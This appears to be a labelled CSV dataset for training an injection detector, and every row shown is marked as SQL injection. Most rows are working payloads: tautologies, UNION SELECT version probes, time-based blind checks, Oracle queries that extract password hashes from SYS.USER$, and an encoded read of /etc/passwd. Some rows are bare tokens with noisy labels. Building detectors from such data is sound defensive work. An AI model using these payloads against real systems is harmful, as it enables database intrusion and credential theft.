Sentence,SQLInjection,XSS,Normal
""" or pg_sleep ( __TIME__ ) --",1,0,0
create user name identified by pass123 temporary tablespace temp default tablespace users; ,1,0,0
29%,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1,0,0
" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",1,0,0
" select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1,0,0
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1,0,0
 select * from users where id = 1 +$+ or 1 = 1 -- 1,1,0,0
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1,0,0
" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'",1,0,0
" select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",1,0,0
? or 1 = 1 --,1,0,0
 )  or  ( 'a' = 'a,1,0,0
admin' or 1 = 1#,1,0,0
" select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1,0,0
or 1 = 1 --,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1,0,0
" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1,0,0
" select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1,0,0
# from wapiti,1,0,0
 ( ||6 ) ,1,0,0
" select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1,0,0
'*',1,0,0
distinct,1,0,0
*/*,1,0,0
 select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1,0,0
to_timestamp_tz,1,0,0
a' ,1,0,0
"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1,0,0
 select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1,0,0
"admin"" or ""1"" = ""1""--",1,0,0
" select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1,0,0
insert,1,0,0
@,1,0,0
" select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1,0,0
26%,1,0,0
" select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1,0,0
"or 1 = 1 or """" = ",1,0,0
'/**/or/**/1/**/ = /**/1,1,0,0
" select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1,0,0
" select * from users where id = '1' union select ||/1,version (  )  -- 1'",1,0,0
" select * from users where id = '1' union select +\.,@@VERSION -- 1'",1,0,0
or 1 = 1/*,1,0,0
%27 or 1 = 1,1,0,0
" select * from users where id = 1 <@&@ union select 1,version (  )  -- 1",1,0,0
" select * from users where id = '1' union select $*$,@@VERSION -- 1'",1,0,0
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1,0,0
" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",1,0,0
 select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1,0,0
" select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1,0,0
" select * from users where id = 1 union select 1||1,version (  )  -- 1",1,0,0
" select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1,0,0
1s,1,0,0
 select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1,0,0
" select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or "".@"" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1,0,0
 or 1 --',1,0,0
" select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1,0,0
"admin"" or 1 = 1#",1,0,0
'-',1,0,0
" select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1,0,0
\x27UNION SELECT,1,0,0
PRINT,1,0,0
" select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1,0,0
or 1 = 1-- ,1,0,0
1 or pg_sleep ( __TIME__ ) --,1,0,0
" select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1,0,0
admin' )  or  ( '1' = '1'/*,1,0,0
 or 2 between 1 and 3,1,0,0
" select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1,0,0
admin' or '1' = '1,1,0,0
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1,0,0
" select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,0,0
""" or 0 = 0 --",1,0,0
" select * from users where id = 1 union select @ $_,version (  )  -- 1",1,0,0
 select * from users where id = 1 <@.$ or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1,0,0
" select * from users where id = 1 or "",."" or 1 = 1 -- 1",1,0,0
char%4039%41%2b%40SELECT,1,0,0
" select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1,0,0
admin' )  or  ( '1' = '1,1,0,0
declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1,0,0
"or 0 = 0 #""",1,0,0
" select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1,0,0
" or benchmark ( 10000000,MD5 ( 1  )  )  #",1,0,0
' )  or  ( 'x' = 'x,1,0,0
" select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1,0,0
 $ ( sleep 50 ) ,1,0,0
" select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1,0,0
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1,0,0
" select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1,0,0
" select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1,0,0
" select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1,0,0
"""a"""" or 1 = 1--""",1,0,0
" select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1,0,0
